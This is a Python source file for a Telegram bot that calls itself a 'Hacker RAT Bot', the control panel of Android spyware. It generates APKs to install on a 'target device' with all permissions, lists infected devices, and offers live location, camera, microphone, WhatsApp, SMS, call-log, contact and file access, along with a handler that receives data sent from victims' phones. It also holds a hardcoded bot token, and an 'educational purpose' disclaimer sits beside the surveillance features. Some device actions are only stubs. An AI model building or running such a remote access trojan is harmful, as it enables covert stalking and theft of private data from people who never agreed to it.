#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import logging
from datetime import datetime

import requests
import telebot
from flask import Flask, request
from telebot import types

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
# 1️⃣  CONFIGURATION
# ------------------------------------------------------------------
# These values MUST be set in your Railway Environment Variables.
# Do not rely on defaults for production.
BOT_TOKEN   = os.getenv('BOT_TOKEN', '8869480576:AAHtyVBCJrAmGza3VbPfLp7OzRv3RvYqdWw')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '7420647897')
APK_DOMAIN  = os.getenv('APK_DOMAIN', 'https//telegram-bot railway.com')

# ------------------------------------------------------------------
# 2️⃣  IMPORTS OF YOUR OWN MODULES
# ------------------------------------------------------------------
# Ensure these files exist in the same directory or are installed
try:
    from database import DeviceDatabase
    from apk_generator import APKGenerator
except ImportError as e:
    print(f"Import error: {e}")
    print("Ensure 'database.py' and 'apk_generator.py' are in the project root.")
    # Fallback stubs if modules are missing (for testing syntax)
    class DeviceDatabase:
        def __init__(self): pass
        def get_devices(self, chat_id): return []
        def get_device(self, dev_id): return None
        def update_device(self, data): pass
    class APKGenerator:
        def __init__(self): pass
        def generate_apk(self, name, chat_id): return f"generated/{name}.apk"

# ------------------------------------------------------------------
# 3️⃣  GLOBAL INSTANCES
# ------------------------------------------------------------------
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='JSON')
db = DeviceDatabase()
apk_gen = APKGenerator()
app = Flask(__name__)

# ------------------------------------------------------------------
# 4️⃣  WELCOME MESSAGE
# ------------------------------------------------------------------
WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉

📱 *Features:*
✅ Generate APK for any Android
✅ Live Location Tracking
✅ WhatsApp Messages Monitor
✅ Call Logs (Incoming/Outgoing)
✅ Camera (Front & Back) Photos
✅ Microphone Recording
✅ SMS Reading
✅ Contacts Access
✅ File Manager
✅ App List
✅ Battery & Network Info

⚠️ *This bot is only for educational purpose – please don't use it for illegal activities.*

👉 If you need help, contact the owner: https://t.me/Nawab_Zada_Hacker_007

Press /start to begin!"""

# ------------------------------------------------------------------
# 5️⃣  START COMMAND
# ------------------------------------------------------------------
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = str(message.chat.id)
    logger.info(f"Start command received from {chat_id}")

    # If the chat is not the admin, ask for token & chat id
    if chat_id != ADMIN_CHAT_ID:
        bot.send_message(
            chat_id,
            "❌ You are not the admin. Please send your *bot token* so I can set it for you.\n\n"
            "⚠️ Note: This feature is disabled in this version for stability. "
            "Please set the ADMIN_CHAT_ID environment variable to your ID."
        )
        return

    # Normal admin flow – show the main menu
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk"),
        types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices"),
        types.InlineKeyboardButton("🔍 All Features", callback_data="features"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    )
    bot.send_message(chat_id, WELCOME_MSG, reply_markup=markup)

# ------------------------------------------------------------------
# 6️⃣  CALLBACK HANDLER
# ------------------------------------------------------------------
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        if call.data == "gen_apk":
            handle_generate_apk(call)
        elif call.data == "my_devices":
            handle_my_devices(call)
        elif call.data == "features":
            handle_features(call)
        elif call.data == "settings":
            handle_settings(call)
        elif call.data.startswith("dev_"):
            handle_device_menu(call)
        elif call.data.startswith("action_"):
            handle_device_action(call)
        elif call.data == "back":
            # Send the main menu again
            start(call.message)
        elif call.data == "confirm":
            call.answer("Confirmed! ✅")
        else:
            call.answer()
    except Exception as e:
        logger.error(f"Error in callback handler: {e}", exc_info=True)
        call.answer("An error occurred. Please try again.")

# ------------------------------------------------------------------
# 7️⃣  APK GENERATION
# ------------------------------------------------------------------
def handle_generate_apk(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))

    msg = bot.send_message(
        call.message.chat.id,
        "📱 *Enter APK Name* (e.g., MyScanner):\n\n⚠️ Only letters and numbers",
        reply_markup=markup
    )
    bot.register_next_step_handler(msg, process_apk_name)

def process_apk_name(message):
    apk_name = message.text.strip()
    chat_id  = message.chat.id

    if not apk_name or not apk_name.replace(' ', '').isalnum():
        bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
        return

    # Generate the APK
    apk_url = apk_gen.generate_apk(apk_name, chat_id)

    # Make sure the URL contains the domain
    if not apk_url.startswith(('http://', 'https://')):
        apk_url = f"{APK_DOMAIN.rstrip('/')}/{apk_url.lstrip('/')}"

    bot.send_message(
        chat_id,
        f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!"
    )

# ------------------------------------------------------------------
# 8️⃣  DEVICE HANDLERS
# ------------------------------------------------------------------
def handle_my_devices(call):
    chat_id = call.message.chat.id
    devices_list = db.get_devices(chat_id)

    if not devices_list:
        bot.send_message(chat_id, "📭 No devices connected yet.\n\nInstall APK on target device first.")
        return

    markup = types.InlineKeyboardMarkup()
    for dev in devices_list:
        btn = types.InlineKeyboardButton(
            f"📱 {dev['name']} ({dev['model']})",
            callback_data=f"dev_{dev['device_id']}"
        )
        markup.add(btn)

    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)

    bot.send_message(chat_id, "📱 *Your Connected Devices:*", reply_markup=markup)

def handle_device_menu(call):
    dev_id   = call.data.replace("dev_", "")
    device   = db.get_device(dev_id)

    if not device:
        bot.send_message(call.message.chat.id, "❌ Device not found.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📍 Live Location", callback_data=f"action_loc_{dev_id}"),
        types.InlineKeyboardButton("📸 Camera", callback_data=f"action_cam_{dev_id}"),
        types.InlineKeyboardButton("🎤 Mic Record", callback_data=f"action_mic_{dev_id}"),
        types.InlineKeyboardButton("💬 WhatsApp", callback_data=f"action_whatsapp_{dev_id}"),
        types.InlineKeyboardButton("📞 Call Logs", callback_data=f"action_calls_{dev_id}"),
        types.InlineKeyboardButton("📁 Files", callback_data=f"action_files_{dev_id}"),
        types.InlineKeyboardButton("📱 Apps", callback_data=f"action_apps_{dev_id}"),
        types.InlineKeyboardButton("📞 Contacts", callback_data=f"action_contacts_{dev_id}"),
        types.InlineKeyboardButton("📊 Device Info", callback_data=f"action_info_{dev_id}"),
        types.InlineKeyboardButton("🔙 Back", callback_data="my_devices")
    )

    info = f"""📱 *Device Info:*
🆔 ID: {device['device_id']}
📛 Name: {device['name']}
📟 Model: {device['model']}
🤖 Android: {device['android_version']}
🔋 Battery: {device.get('battery', 'Unknown')}%
🕐 Last Seen: {device.get('last_seen', 'Never')}
"""
    bot.send_message(call.message.chat.id, info, reply_markup=markup)

def handle_device_action(call):
    parts   = call.data.split("_")
    action  = parts[1]
    dev_id  = parts[-1]
    chat_id = call.message.chat.id
    device  = db.get_device(dev_id)

    if not device:
        bot.send_message(chat_id, "❌ Device not found.")
        return

    # Example action implementation
    if action == 'loc':
        bot.send_message(chat_id, f"📍 Requesting location from {device['name']}...")
    elif action == 'cam':
        bot.send_message(chat_id, f"📸 Requesting camera photo from {device['name']}...")
    # Add more actions as needed

    call.answer()

def handle_features(call):
    features = """🎯 *Bot Features:*

📱 *Device Monitoring:*
• Live Location Tracking
• Device Info (Model, Android, Battery)
• Network Status

📸 *Camera:*
• Front Camera Photos
• Back Camera Photos
• Live Camera Stream

🎤 *Audio:*
• Microphone Recording
• Call Recording

💬 *Messages:*
• WhatsApp Messages
• SMS Reading
• Call Logs

📁 *Files:*
• File Manager
• App List
• Contacts Access

⚙️ *Settings:*
• Bot Token Setup
• Chat ID Setup
• Device Management
"""
    bot.send_message(call.message.chat.id, features)

def handle_settings(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="back")
    )
    bot.send_message(
        call.message.chat.id,
        "⚙️ *Settings*:\n\nConfigure your bot settings via Environment Variables in Railway.\n\n"
        f"Current Admin Chat ID: {ADMIN_CHAT_ID}\n"
        f"Current APK Domain: {APK_DOMAIN}",
        reply_markup=markup
    )

# ------------------------------------------------------------------
# 9️⃣  DEVICE DATA RECEIVER (from APK to Bot)
# ------------------------------------------------------------------
@bot.message_handler(func=lambda m: m.text.startswith("DATA:"))
def receive_device_data(message):
    try:
        data_str = message.text.replace("DATA:", "").strip()
        data = json.loads(data_str)
        db.update_device(data)
        # Notify admin only if it's a significant update or first time
        bot.send_message(ADMIN_CHAT_ID, f"✅ Data received from device: {data.get('device_id', 'Unknown')}")
    except Exception as e:
        logger.error(f"Error receiving data: {e}")

# ------------------------------------------------------------------
# 🔟  FLASK ENDPOINTS FOR WEBHOOK
# ------------------------------------------------------------------
@app.route('/webhook', methods=['POST'])
def webhook():
    """
    Telegram sends updates to this endpoint.
    The path is hardcoded to '/webhook' for simplicity and stability.
    """
    update = telebot.types.Update.de_json(request.json)
    bot.process_new_updates([update])
    return "ok", 200

@app.route("/")
def index():
    return "Nawab Zada Hacker RAT Bot is running!", 200

# ------------------------------------------------------------------
# 1️⃣1️⃣  WEBHOOK SETUP
# ------------------------------------------------------------------
def set_webhook():
    """
    Register the webhook with Telegram.
    """
    # Get the public URL
    # Railway exposes RAILWAY_STATIC_URL or RAILWAY_PUBLIC_DOMAIN
    # Render exposes RENDER_EXTERNAL_HOSTNAME
    hostname = os.getenv("RAILWAY_STATIC_URL") or os.getenv("RENDER_EXTERNAL_HOSTNAME") or os.getenv("PUBLIC_URL")
    
    if not hostname:
        # Fallback for local development
        hostname = "localhost:5000"
        is_local = True
    else:
        is_local = False

    # Ensure it's HTTPS
    if not hostname.startswith('http'):
        hostname = f"https://{hostname}"

    webhook_url = f"{hostname}/webhook"
    
    logger.info(f"Setting webhook to: {webhook_url}")
    
    try:
        bot.set_webhook(url=webhook_url)
        logger.info("Webhook set successfully.")
    except Exception as e:
        logger.error(f"Failed to set webhook: {e}")
        # If webhook fails, we can fallback to polling for local dev
        if is_local:
            logger.info("Falling back to polling for local development.")
            bot.polling(none_stop=True)

# ------------------------------------------------------------------
# 1️⃣2️⃣  MAIN ENTRY POINT
# ------------------------------------------------------------------
if __name__ == '__main__':
    print("Starting bot...")
    
    # Check if we are in a local environment (no public URL)
    # If no public URL is detected, we might want to poll instead of webhook
    # However, Railway always provides a public URL.
    # If you are running locally, set PUBLIC_URL or rely on localhost.
    
    # For production (Railway/Render), we MUST use webhook.
    # For local dev, you can set a tunneling service like ngrok.
    
    # Attempt to set webhook. If it fails and we are likely local, poll.
    # But since this is for Railway, we assume webhook is correct.
    
    set_webhook()
    
    # Run Flask
    port = int(os.getenv('PORT', 5000))
    logger.info(f"Starting Flask on port {port}")
    app.run(host='0.0.0.0', port=port)
